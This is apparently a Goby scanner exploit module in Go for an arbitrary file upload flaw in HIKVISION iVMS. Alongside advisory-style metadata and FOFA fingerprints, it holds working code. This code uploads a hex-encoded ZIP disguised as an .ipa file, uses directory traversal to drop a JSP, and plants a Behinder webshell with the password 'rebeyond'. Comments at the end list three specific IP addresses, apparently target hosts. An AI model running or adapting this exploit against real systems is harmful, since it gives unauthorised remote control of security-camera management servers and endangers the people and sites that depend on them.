package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iVMS upload.action file upload vulnerability",
    "Description": "<p>HIKVISION iVMS is an \"integrated\", \"digital\" and \"intelligent\" platform, including multiple subsystems such as video, alarm, access control, visitor, elevator control, inspection, attendance, consumption, parking lot, video intercom, etc. .</p><p>HIKVISION iVMS upload.action has an arbitrary file upload vulnerability. The attacker cooperates with the front-end permissions to bypass by constructing a malicious ipa installation package containing directory traversal, thereby obtaining server permissions.</p>",
    "Product": "HIKVISION-iVMS",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-02-14",
    "Author": "h1ei1",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "Level": "2",
    "Impact": "<p>HIKVISION iVMS upload.action has an arbitrary file upload vulnerability. The attacker cooperates with the front-end permissions to bypass by constructing a malicious ipa installation package containing directory traversal, thereby obtaining server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.hikvision.com/.\">https://www.hikvision.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iVMS upload.action 文件上传漏洞",
            "Product": "HIKVISION-iVMS",
            "Description": "<p>HIKVISION iVMS 是一套“集成化”、“数字化”、“智能化”的平台，包含视频、报警、门禁、访客、梯控、巡查、考勤、消费、停车场、可视对讲等多个子系统。<br></p><p>HIKVISION iVMS upload.action 存在任意文件上传漏洞，攻击者配合前台权限绕过通过构造包含目录穿越的恶意 ipa 安装包，从而获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a>。<br></p>",
            "Impact": "<p>HIKVISION iVMS upload.action 存在任意文件上传漏洞，攻击者配合前台权限绕过通过构造包含目录穿越的恶意 ipa 安装包，从而获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "HIKVISION iVMS upload.action file upload vulnerability",
            "Product": "HIKVISION-iVMS",
            "Description": "<p>HIKVISION iVMS is an \"integrated\", \"digital\" and \"intelligent\" platform, including multiple subsystems such as video, alarm, access control, visitor, elevator control, inspection, attendance, consumption, parking lot, video intercom, etc. .</p><p>HIKVISION iVMS upload.action has an arbitrary file upload vulnerability. The attacker cooperates with the front-end permissions to bypass by constructing a malicious ipa installation package containing directory traversal, thereby obtaining server permissions.</p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.hikvision.com/.\">https://www.hikvision.com/.</a><br></p>",
            "Impact": "<p>HIKVISION iVMS upload.action has an arbitrary file upload vulnerability. The attacker cooperates with the front-end permissions to bypass by constructing a malicious ipa installation package containing directory traversal, thereby obtaining server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10836"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			hexPOC, _ := hex.DecodeString("504B030414000000080014B1305676B81B6CA8000000C40000000A0000006A7370706F632E6A73701D8ECD0A824014465F25046166338B88365690684170ED47296A37E855A7A6D174D49AA76F7477CEB7387C2BB7EA34AB1BA1B45444E1308BB59562C2B653EC2DDA94F9DB385C2E024CAB0C1B42593691DFE5B955E79184F32839FF2009BFB03F9410C0704C64093718C0BC0C98D4DCCD554401AC1D4AA937B69FBCE74C546C2724125ED752A45C8B4AB102F505B93C715D92063F1DB67ADC626C7A897A9A6DC35EB086847AEEE60F504B0102140014000000080014B1305676B81B6CA8000000C40000000A00000000000000010000000000000000006A7370706F632E6A7370504B0506000000000100010038000000D00000000000")
			randName := goutils.RandomHexString(6)
			uri := "/msp/home/upload.action;getPic?&type=ios"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("user-agent", "MicroMessenger")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------884337038")
			cfg.Data = fmt.Sprintf("----------884337038\r\nContent-Disposition: form-data; name=\"file\";filename=\"%s.ipa\"\r\n\r\n%s\r\n----------884337038--", randName, string(hexPOC))
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "\"success\":true}") {
				uri2 := fmt.Sprintf("/msp/upload/ios/%s/jsppoc.jsp;getPic", randName)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//cmd := ss.Params["filePath"].(string)
			hexPOC, _ := hex.DecodeString("504B0304140000000800CD1213512CB9DC92C101000064020000090000007368656C6C2E6A73705D924F6B134118C6BFCAB8109809CB54D3A650B62936B18258B1B8C68B78D89D7D77336633B3CE9FDA100A164410DA1E3C951EC483BDDAAB68C52FD3D8F4E45770260B21787B9E777FF3CCCE33B3D9B85F2505203EAAA4329DE075B29F506B78499BA1D70794A97165E4FF5657C06833686C6D36EEB032D11AF5111C181099463DEF776592819AF4F192438C4CB4AD406146A2C3CAA62567358D0A9C8E0DA097AF52325160AC12684ED20C722E600EE134BC1BA6B4045198810B38F4BBF31C61056F2C68430B304FC00C64860975A3A4D438D87B1A3F0F0899C4467151A0612780B536ACB6367248DBD946AB9D06D14A73767931BDFC70FBE9E2FAFB8FD9EFCF7F4EBDBDF972B4DABAFE7532CADAD3775737E7EFA71F4FEEADBBC1DFABE3DB9F67B36F5F975105298CA5C89A2B1AB4E652D0CA9A174969010736088724EAF16AE04BE8D4C2FFEE23A14D229843B677E280448C72C10D6E8502DEA21898ABE2318C6357361E7ABEEB4AD29884354E228FF5B11970EDBFD62D9185AC5BC7C44D30A3997CC8455262BF465B41475C33DADD8E77D6D71E009373D2D5ED55D7E6B9B34BBD3E833A8A2A2776DD8DB85497EBB216475874EE1F544F0AE3DE83BBA5C6D63F504B01021400140000000800CD1213512CB9DC92C1010000640200000900000000000000010000000000000000007368656C6C2E6A7370504B0506000000000100010037000000E80100000000")
			randName := goutils.RandomHexString(6)
			uri := "/msp/home/upload.action;getPic?&type=ios"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("user-agent", "MicroMessenger")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------884337038")
			cfg.Data = fmt.Sprintf("----------884337038\r\nContent-Disposition: form-data; name=\"file\";filename=\"%s.ipa\"\r\n\r\n%s\r\n----------884337038--", randName, string(hexPOC))
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "\"success\":true}") {
				expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/msp/upload/ios/%s/jsppoc.jsp;getPic\n", randName)
				expResult.Output += "Password：rebeyond\n"
				expResult.Output += "Webshell tool: Behinder v3.0"
				expResult.Success = true
			}
			return expResult
		},
	))
}
//http://211.145.28.30
//http://81.63.178.141/
//http://111.21.246.18/